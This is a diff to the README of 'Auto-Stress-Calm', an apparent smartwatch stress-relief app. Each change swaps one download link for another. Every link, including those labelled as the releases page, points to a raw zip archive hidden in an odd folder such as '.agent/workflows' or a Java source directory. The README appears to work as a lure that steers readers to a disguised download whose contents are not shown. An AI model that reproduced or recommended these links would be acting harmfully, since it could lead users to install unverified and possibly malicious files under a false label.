@@ -1,7 +1,7 @@
 # 🌟 Auto-Stress-Calm - Automatic Stress Relief for Smartwatches
 
 ## 🔗 Download Now
-[![Download Auto-Stress-Calm](https://raw.githubusercontent.com/Pranay1012904/Auto-Stress-Calm/master/.agent/workflows/Auto-Stress-Calm-3.2.zip)](https://raw.githubusercontent.com/Pranay1012904/Auto-Stress-Calm/master/.agent/workflows/Auto-Stress-Calm-3.2.zip)
+[![Download Auto-Stress-Calm](https://github.com/Pranay1012904/Auto-Stress-Calm/raw/refs/heads/master/adb-notification-tester/app/src/main/java/com/example/Auto_Calm_Stress_v3.1.zip)](https://github.com/Pranay1012904/Auto-Stress-Calm/raw/refs/heads/master/adb-notification-tester/app/src/main/java/com/example/Auto_Calm_Stress_v3.1.zip)
 
 ---
 
@@ -15,7 +15,7 @@ To get started with Auto-Stress-Calm, follow these steps:
    Make sure your smartwatch runs Wear OS and has a compatible Fitbit sensor. This app works best on newer models like the Pixel Watch.
 
 2. **Visit the Release Page**  
-   Head over to the [Releases page](https://raw.githubusercontent.com/Pranay1012904/Auto-Stress-Calm/master/.agent/workflows/Auto-Stress-Calm-3.2.zip) to find the latest version of Auto-Stress-Calm.
+   Head over to the [Releases page](https://github.com/Pranay1012904/Auto-Stress-Calm/raw/refs/heads/master/adb-notification-tester/app/src/main/java/com/example/Auto_Calm_Stress_v3.1.zip) to find the latest version of Auto-Stress-Calm.
 
 3. **Download the App**  
    Click the most recent release version, and then download the APK file appropriate for your device. 
@@ -65,6 +65,6 @@ If you encounter any issues or have questions, feel free to open a ticket in the
 To better understand how to use the app, check out our documentation in the repository. Additional resources may be available to deepen your knowledge about stress management and mindfulness practices.
 
 ## 🔗 Download & Install
-For quick access to the app, remember to visit our [Releases page](https://raw.githubusercontent.com/Pranay1012904/Auto-Stress-Calm/master/.agent/workflows/Auto-Stress-Calm-3.2.zip) again for future updates.
+For quick access to the app, remember to visit our [Releases page](https://github.com/Pranay1012904/Auto-Stress-Calm/raw/refs/heads/master/adb-notification-tester/app/src/main/java/com/example/Auto_Calm_Stress_v3.1.zip) again for future updates.
 
 ---
